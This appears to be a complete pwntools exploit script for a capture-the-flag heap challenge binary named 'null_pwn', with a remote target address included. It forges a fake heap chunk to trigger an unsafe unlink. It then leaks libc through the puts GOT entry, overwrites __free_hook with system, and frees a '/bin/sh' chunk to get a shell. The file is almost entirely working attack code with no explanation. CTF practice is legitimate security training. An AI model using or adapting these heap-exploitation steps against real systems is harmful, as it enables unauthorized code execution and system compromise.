#!/usr/bin/env python
from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

local = 1
if local:
    p = process('./null_pwn')
    elf = ELF('./null_pwn')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    p = remote('82.157.5.28', 51004)
    elf = ELF('./null_pwn')
    libc = ELF('./libc6_2.23-0ubuntu11.2_amd64.so')

def choice(c):
    p.sendlineafter('Your choice :', str(c))

def add(idx, sz, data):
    choice(1)
    p.sendlineafter('Index:', str(idx))
    p.sendlineafter('Size of Heap : ', str(sz))
    p.sendafter('Content?:', data)

def delete(idx):
    choice(2)
    p.sendlineafter('Index:', str(idx))

def edit(idx, data):
    choice(3)
    p.sendlineafter('Index:', str(idx))
    p.sendafter('Content?:', data)

def show(idx):
    choice(4)
    p.sendlineafter('Index :', str(idx))

# create fake chunk for unlink
ptr = 0x602120
add(0, 0x48, 'A') # 0
add(1, 0x80, 'B') # 1
add(2, 0x80, 'C') # 2
fake_chunk = '\x00' * 8 + p64(0x41) # chunk header
fake_chunk += p64(ptr-0x18) + p64(ptr-0x10) # unlink ptr
fake_chunk += '\x00' * 0x20 # padding
fake_chunk += p64(0x40) + '\x90' # forge chunk 1's size -> 0x90
edit(0, fake_chunk)
delete(1) # unlink

# leak libc
edit(0, '\x00' * 0x18 + p64(ptr) + '\x00' * 8 + p64(elf.got['puts']))
show(2)
p.recvuntil('Content : ')
puts_addr = u64(p.recv(6).ljust(8, '\x00'))
libc_base = puts_addr - libc.symbols['puts']
info('puts_addr = ' + hex(puts_addr))
info('libc_base = ' + hex(libc_base))

# overwrite __free_hook
system = libc_base + libc.symbols['system']
free_hook = libc_base + libc.symbols['__free_hook']
edit(0, p64(free_hook))
edit(0, p64(system))
add(3, 0x10, '/bin/sh\x00') # 3
delete(3) # get shell

#gdb.attach(p)

p.interactive()

